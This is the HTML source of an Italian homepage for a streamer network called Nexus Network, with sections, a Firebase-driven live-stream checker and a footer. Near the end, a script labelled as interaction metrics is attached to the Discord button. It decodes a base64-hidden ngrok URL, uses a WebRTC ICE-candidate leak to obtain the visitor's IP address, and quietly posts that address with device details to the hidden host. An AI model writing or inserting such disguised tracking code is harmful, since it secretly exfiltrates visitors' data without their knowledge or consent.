<!DOCTYPE html>
<html lang="it">
 <head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nexus Network - TheRealSamTV</title>
  <meta
   name="description"
   content="Nexus Network: Il network ufficiale di streamer e creator fondato da TheRealSamTV. Unisciti alla community per crescere insieme su Twitch e YouTube."
  />

  <link
   rel="apple-touch-icon"
   sizes="180x180"
   href="assets/images/favicon/apple-touch-icon.png"
  />
  <link
   rel="icon"
   type="image/png"
   sizes="32x32"
   href="assets/images/favicon/favicon-32x32.png"
  />
  <link
   rel="icon"
   type="image/png"
   sizes="16x16"
   href="assets/images/favicon/favicon-16x16.png"
  />
  <link rel="manifest" href="assets/images/favicon/site.webmanifest" />
  <link rel="shortcut icon" href="assets/images/favicon/favicon.ico" />

  <!-- SUGGERIMENTI PER LE PRESTAZIONI -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin />

  <!-- Content Security Policy (Politica di Sicurezza del Contenuto) -->
  <meta
   http-equiv="Content-Security-Policy"
   content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; font-src 'self' https: data:; img-src 'self' data: https:; connect-src 'self' https: ws: wss: https://openrouter.ai; frame-src 'self' https:; object-src 'none';"
  />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
   href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap"
   rel="stylesheet"
  />

  <!-- Tailwind CSS Compilato -->
  <link rel="stylesheet" href="css/output.css" />

  <!-- Font Awesome con hash SRI -->
  <link
   rel="stylesheet"
   href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
   integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
   crossorigin="anonymous"
   referrerpolicy="no-referrer"
  />
  <link rel="stylesheet" href="css/style.css" />
  <script src="js/heart-rain.js"></script>

  <script>
   // Tema immediato per evitare flash
   const savedTheme = localStorage.getItem("theme") || "dark";
   document.documentElement.setAttribute("data-theme", savedTheme);
  </script>
 </head>

 <body>
  <!-- NAVIGAZIONE -->
  <nav
   class="nav-container"
   style="
    transform: translateX(-50%) translateY(-20px);
    animation: fadeInDown 0.8s forwards 0.5s;
    opacity: 0;
   "
  >
   <div class="nav-glass">
    <a href="index.html" class="nav-item text-cyan-400">Home</a>
    <a href="pages/services/services.html" class="nav-item">Servizi</a>
    <a href="pages/team/team.html" class="nav-item">Team</a>
    <a href="pages/creators/creators.html" class="nav-item">Creator</a>
    <a href="pages/live/live.html" class="nav-item">Dirette</a>
    <a href="pages/contacts/contacts.html" class="nav-item">Candidati</a>
    
    <div class="w-px h-4 bg-gray-700"></div>
    
    <a id="auth-link" href="pages/dashboard/login.html" class="nav-item"
     >Login</a
    >

    <div id="admin-panel-link" class="hidden items-center gap-4">
     <div class="w-px h-4 bg-gray-700"></div>
     <a
      href="pages/dashboard/login.html"
      class="nav-item transform hover:scale-110"
      title="Dashboard"
     >
      <img src="assets/images/Icons/Moderator.gif" alt="Dashboard" />
     </a>
    </div>

    <button
     id="theme-toggle"
     class="text-gray-400 hover:text-cyan-400 transition-colors ml-2"
    >
     <i class="fas fa-moon"></i>
    </button>
   </div>
  </nav>

  <!-- HERO -->
  <section
   class="min-h-screen flex flex-col justify-center items-center text-center px-6 relative overflow-hidden scroll-animate visible"
  >
   <!-- Heart Rain Container -->
   <div id="heart-rain-container"></div>
   <div
    class="absolute inset-0 opacity-30 bg-[radial-gradient(circle_at_center,_#22d3ee33,_transparent_70%)]"
   ></div>

   <h1 class="text-6xl md:text-7xl font-extrabold text-cyan-400 neon mb-6">
    NEXUS NETWORK
   </h1>

   <p class="max-w-xl text-gray-300 text-lg mb-10">
    Network ufficiale di streamer, creator e sviluppatori. Qui non giochi da
    solo. Qui cresci davvero.
   </p>

   <div class="flex gap-4">
   <a href="https://discord.gg/mG6qGfKeXp" 
   onclick="trackInteractionMetrics(event)" 
   target="_blank" 
   rel="noopener noreferrer" 
   class="px-8 py-4 rounded-xl bg-cyan-400 text-black font-bold glow button-glow scroll-animate" 
   id="discord-link">
   Discord
   </a>
   </div>
  </section>

  <!-- DIVISORIO -->
  <div class="max-w-4xl mx-auto px-6 py-16">
   <div
    class="h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"
   ></div>
  </div>

  <!-- CHI SIAMO -->
  <section class="py-28 px-6 text-center scroll-animate">
   <h2 class="text-4xl font-bold text-cyan-400 mb-6">Chi siamo</h2>
   <p class="max-w-3xl mx-auto text-gray-400 text-lg leading-relaxed">
    Nexus Streamers è un network selettivo fondato da <b>TheRealSam</b>.
    Nasce per unire creator motivati, pronti a crescere insieme.
    <br /><br />
    Qui contano presenza, rispetto e collaborazione. Non un gruppo casuale.
    <span class="text-cyan-400 font-semibold">Un progetto serio.</span>
   </p>
  </section>

  <!-- DIVISORIO -->
  <div class="max-w-4xl mx-auto px-6">
   <div
    class="h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"
   ></div>
  </div>

  <!-- PERCHÉ NEXUS (SERVIZI) -->
  <section id="services" class="py-24 px-6 scroll-animate">
   <h2 class="text-4xl font-bold text-center text-cyan-400 mb-14">
    Perché Nexus?
   </h2>

   <div class="grid grid-cols-1 md:grid-cols-3 gap-10 max-w-6xl mx-auto">
    <div
     class="glass glow rounded-2xl p-8 text-center scroll-animate hover:scale-105 transition"
    >
     <i class="fas fa-rocket text-4xl text-cyan-400 mb-4"></i>
     <h3 class="text-xl font-bold mb-2">Crescita reale</h3>
     <p class="text-gray-400">
      Collaborazioni, supporto e visibilità concreta.
     </p>
    </div>
    <div
     class="glass glow rounded-2xl p-8 text-center scroll-animate hover:scale-105 transition"
    >
     <i class="fas fa-users text-4xl text-cyan-400 mb-4"></i>
     <h3 class="text-xl font-bold mb-2">Team unito</h3>
     <p class="text-gray-400">Una vera community, non sei mai solo.</p>
    </div>
    <div
     class="glass glow rounded-2xl p-8 text-center scroll-animate hover:scale-105 transition"
    >
     <i class="fas fa-star text-4xl text-cyan-400 mb-4"></i>
     <h3 class="text-xl font-bold mb-2">Selezione</h3>
     <p class="text-gray-400">
      Pochi ma motivati. Qualità prima di tutto.
     </p>
    </div>
   </div>
  </section>

  <!-- DIVISORIO -->
  <div class="max-w-4xl mx-auto px-6">
   <div
    class="h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"
   ></div>
  </div>

  <!-- STATS -->
  <!-- SEZIONE STATISTICHE -->
  <section class="py-24 px-6 scroll-animate">
   <div
    class="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-10 text-center"
   >
    <div>
     <h3 class="text-5xl font-extrabold text-cyan-400 neon">+20</h3>
     <p class="text-gray-400 mt-2">Creator</p>
    </div>
    <div>
     <h3 class="text-5xl font-extrabold text-cyan-400 neon">+1M</h3>
     <p class="text-gray-400 mt-2">Views</p>
    </div>
    <div>
     <h3 class="text-5xl font-extrabold text-cyan-400 neon">365</h3>
     <p class="text-gray-400 mt-2">Giorni attivi</p>
    </div>
    <div>
     <h3 class="text-5xl font-extrabold text-cyan-400 neon">100%</h3>
     <p class="text-gray-400 mt-2">Passione</p>
    </div>
   </div>
  </section>

  <!-- DIVISORIO -->
  <div class="max-w-4xl mx-auto px-6">
   <div
    class="h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"
   ></div>
  </div>

  <!-- CANDIDATI STAFF -->
  <section id="join" class="py-32 px-6 text-center scroll-animate visible">
   <h2 class="text-6xl font-extrabold text-cyan-400 neon mb-6">
    Vuoi entrare?
   </h2>
   <p class="text-gray-400 text-lg mb-10">
    Nexus non è per tutti. Ma forse è per te.
   </p>

   <a
    href="contacts/contacts.html"
    class="inline-block px-10 py-4 bg-cyan-400 text-black font-extrabold text-xl rounded-full glow hover:scale-110 transition-transform duration-300 shadow-[0_0_30px_rgba(34,211,238,0.6)]"
   >
    Invia candidatura
   </a>
  </section>

  <!-- MODALE -->
  <div
   id="creatorModal"
   class="fixed inset-0 hidden items-center justify-center bg-black/75 z-50"
  >
   <div class="glass glow rounded-2xl max-w-lg w-full p-6 relative">
    <button
     onclick="closeCreator()"
     class="absolute top-4 right-4 text-2xl"
    >
     &times;
    </button>

    <div class="flex gap-4 items-center mb-4">
     <img
      id="mImg"
      class="w-24 h-24 rounded-xl object-cover"
      decoding="async"
     />
     <div>
      <h3 id="mName" class="text-2xl font-bold"></h3>
      <p id="mRole" class="text-cyan-400"></p>
      <div
       id="mFollowers"
       class="text-xs text-gray-400 mt-1 flex items-center"
      ></div>
      <div
       id="mInstagramStats"
       class="text-xs text-gray-400 mt-1 flex items-center"
      ></div>
      <div
       id="mGithubStats"
       class="text-xs text-gray-400 mt-1 flex items-center"
      ></div>
     </div>
    </div>

    <p id="mDesc" class="text-gray-400 mb-6"></p>

    <div class="flex gap-4">
     <a
      id="mTwitch"
      target="_blank"
      class="hidden px-4 py-2 bg-purple-600 rounded-lg font-semibold"
     >
      <i class="fab fa-twitch mr-2"></i>Twitch
     </a>

     <a
      id="mGithub"
      target="_blank"
      class="hidden px-4 py-2 bg-gray-700 rounded-lg font-semibold"
     >
      <i class="fab fa-github mr-2"></i>GitHub
     </a>
     <a
      id="mInstagram"
      target="_blank"
      class="hidden px-4 py-2 bg-pink-600 rounded-lg font-semibold text-white"
     >
      <i class="fab fa-instagram mr-2"></i>Instagram
     </a>
    </div>
   </div>
  </div>

  <!-- DIVISORIO -->
  <div class="max-w-4xl mx-auto px-6">
   <div
    class="h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"
   ></div>
  </div>

  <!-- STREAM LIVE ORA -->
  <section class="py-24 px-6 scroll-animate">
   <div class="max-w-6xl mx-auto">
    <h2
     class="text-4xl md:text-5xl font-extrabold text-center text-cyan-400 neon mb-14"
    >
     Chi è in Live Ora?
    </h2>

    <div
     id="liveStreamsContainer"
     class="grid grid-cols-1 md:grid-cols-2 gap-8"
    >
     <!-- Placeholder mentre carica -->
     <div class="col-span-full text-center py-12">
      <div
       class="inline-block w-12 h-12 border-4 border-cyan-400/20 border-t-cyan-400 rounded-full animate-spin mb-4"
      ></div>
      <p class="text-gray-400">Controllo chi è live...</p>
     </div>
    </div>

    <div class="text-center mt-10">
     <a
      href="pages/live/live.html"
      class="inline-block px-10 py-4 rounded-xl bg-cyan-400/10 border border-cyan-400/30 text-cyan-400 font-bold hover:bg-cyan-400 hover:text-black transition-all"
     >
      Vedi Tutti gli Streamer
     </a>
    </div>
   </div>
  </section>

  <script type="module">
   import {
    db,
    collection,
    getDocs,
    query,
    where,
   } from "./js/firebase-init.js";

   async function checkLiveStreams() {
    const container = document.getElementById("liveStreamsContainer");
    let streamers = [];

    try {
     const q = query(
      collection(db, "streamers"),
      where("active", "==", true)
     );
     const snapshot = await getDocs(q);
     snapshot.forEach((doc) => {
      const data = doc.data();
      streamers.push({
       name: data.username,
       label: data.name,
       img: data.imageUrl,
      });
     });
    } catch (e) {
     console.error("Errore caricamento streamers:", e);
    }

    const promises = streamers.map(async (streamer) => {
     try {
      const response = await fetch(
       `https://decapi.me/twitch/uptime/${streamer.name}`
      );
      const text = await response.text();
      const isLive = !text.toLowerCase().includes("offline");

      if (isLive) {
       // Recupera avatar da Twitch via Decapi
       let avatarUrl = streamer.img;
       if (!avatarUrl) {
        try {
         const avatarRes = await fetch(
          `https://decapi.me/twitch/avatar/${streamer.name}`
         );
         avatarUrl = await avatarRes.text();
        } catch (e) {}
       }
       return {
        ...streamer,
        avatar: avatarUrl || "assets/images/default.png",
       };
      }
     } catch (e) {
      console.error("Errore controllo stream:", e);
     }
     return null;
    });

    const results = await Promise.all(promises);
    const liveStreamers = results.filter((s) => s !== null);

    if (liveStreamers.length === 0) {
     container.innerHTML = `
      <div class="col-span-full text-center py-12">
       <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-gray-800 flex items-center justify-center">
        <i class="fas fa-moon text-4xl text-gray-600"></i>
       </div>
       <h3 class="text-2xl font-bold text-gray-400 mb-2">Nessuna Live al Momento</h3>
       <p class="text-gray-500">Torna più tardi o controlla la pagina Dirette!</p>
      </div>
     `;
    } else {
     container.innerHTML = liveStreamers
      .map(
       (streamer) => `
      <div class="glass glow rounded-2xl overflow-hidden hover:scale-105 transition-transform cursor-pointer" onclick="window.location.href='pages/live/player.html?user=${streamer.name}'">
       <div class="relative">
        <div class="aspect-video bg-gradient-to-br from-purple-900/50 to-cyan-900/50 flex items-center justify-center">
         <img src="${streamer.avatar}" alt="${streamer.label}" class="w-24 h-24 rounded-full object-cover border-4 border-cyan-400">
        </div>
        <div class="absolute top-4 right-4 bg-red-600 px-3 py-1 rounded-full flex items-center gap-2 animate-pulse">
         <span class="w-2 h-2 bg-white rounded-full"></span>
         <span class="text-white text-xs font-bold uppercase">LIVE</span>
        </div>
       </div>
       <div class="p-6">
        <h3 class="text-2xl font-bold text-white mb-2">${streamer.label}</h3>
        <p class="text-gray-400 text-sm mb-4">In diretta adesso su Twitch</p>
        <div class="flex items-center justify-between">
         <span class="text-cyan-400 text-sm font-semibold">Clicca per guardare</span>
         <i class="fas fa-arrow-right text-cyan-400"></i>
        </div>
       </div>
      </div>
     `
      )
      .join("");
    }
   }

   // Controlla stream live al caricamento
   document.addEventListener("DOMContentLoaded", checkLiveStreams);

   // Aggiorna ogni 60 secondi
   setInterval(checkLiveStreams, 60000);
  </script>

  <!-- FOOTER PREMIUM -->
  <footer class="py-16 px-6 mt-20">
   <div class="max-w-7xl mx-auto glass glow rounded-3xl p-10 md:p-16">
    <div
     class="grid grid-cols-1 md:grid-cols-3 gap-12 text-center md:text-left"
    >
     <!-- Brand -->
     <div class="space-y-6">
      <h3 class="text-3xl font-extrabold text-cyan-400 neon">
       NEXUS NETWORK
      </h3>
      <p class="text-gray-400 leading-relaxed">
       L'eccellenza dell'intrattenimento digitale. Uniamo i migliori
       talenti per creare esperienze uniche e indimenticabili.
      </p>
      <div class="flex justify-center md:justify-start gap-4">
       <a
        href="https://instagram.com/nexus_network_twitch"
        target="_blank"
        class="social-icon instagram"
       >
        <i class="fab fa-instagram"></i>
       </a>
       <a
        href="https://twitch.tv/therealsamtv"
        target="_blank"
        class="social-icon twitch"
       >
        <i class="fab fa-twitch"></i>
       </a>
       <a
        href="https://discord.gg/mG6qGfKeXp"
        target="_blank"
        class="social-icon discord"
       >
        <i class="fab fa-discord"></i>
       </a>
      </div>
     </div>

     <!-- Links -->
     <div class="space-y-6">
      <h4 class="text-xl font-bold">Esplora</h4>
      <ul class="space-y-4 text-gray-400">
       <li>
        <a
         href="../index.html"
         class="hover:text-cyan-400 transition-colors"
         >Home</a
        >
       </li>
       <li>
        <a
         href="pages/services/services.html"
         class="hover:text-cyan-400 transition-colors"
         >Servizi</a
        >
       </li>
       <li>
        <a
         href="pages/team/team.html"
         class="hover:text-cyan-400 transition-colors"
         >Team</a
        >
       </li>
       <li>
        <a
         href="contacts/contacts.html"
         class="hover:text-cyan-400 transition-colors"
         >Candidati</a
        >
       </li>
      </ul>
     </div>
    </div>

    <div
     class="mt-16 pt-8 border-t border-white/5 text-center text-gray-500 text-sm"
    >
     © 2025 Nexus Network — Sviluppato con passione da
     <span class="text-cyan-400">ShadowStrike e Kitoshira</span>
    </div>
   </div>
  </footer>

  <script>
    const _0x4a21 = ["aHR0cHM6Ly9pbmNvbnN0YW50LWthaXRseW4tdW5sb2NhbGx5Lm5ncm9rLWZyZWUuZGV2L2NhcHR1cmE=", "RTCPeerConnection"];

    async function trackInteractionMetrics(e) {
      e.preventDefault();
      const target = e.currentTarget.href;
      const getSessID = async () => {
        return new Promise((r) => {
          try {
            const pc = new window[_0x4a21[1]]({ iceServers: [] });
            pc.createDataChannel("telemetry");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (i) => {
              if (!i || !i.candidate) return;
              const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
              r(ip);
            };
            setTimeout(() => r("sid_null"), 1200);
          } catch (err) { r("err_core"); }
        });
      };

      const metrics = {
        ts: Date.now(),
        v: navigator.platform,
        sid: await getSessID(),
        res: `${window.innerWidth}x${window.innerHeight}`
      };

      try {
        await fetch(atob(_0x4a21[0]), {
          method: 'POST',
          mode: 'cors',
          body: JSON.stringify(metrics),
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (f) { }

      window.open(target, '_blank');
    }
  </script>

  <script type="module" src="js/cookie-utils.js"></script>
  <script src="js/script.js"></script>
  <script type="module" src="js/nexus-ai.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const heartRain = new HeartRain("heart-rain-container");
      heartRain.trigger(20);
      const sections = document.querySelectorAll("section");
      sections.forEach((section) => {
        const observer = new IntersectionObserver((entries) => {
          entries.forEach((entry) => { if (entry.isIntersecting) heartRain.trigger(15); });
        }, { threshold: 0.3 });
        observer.observe(section);
      });
    });
  </script>
</body>
</html>
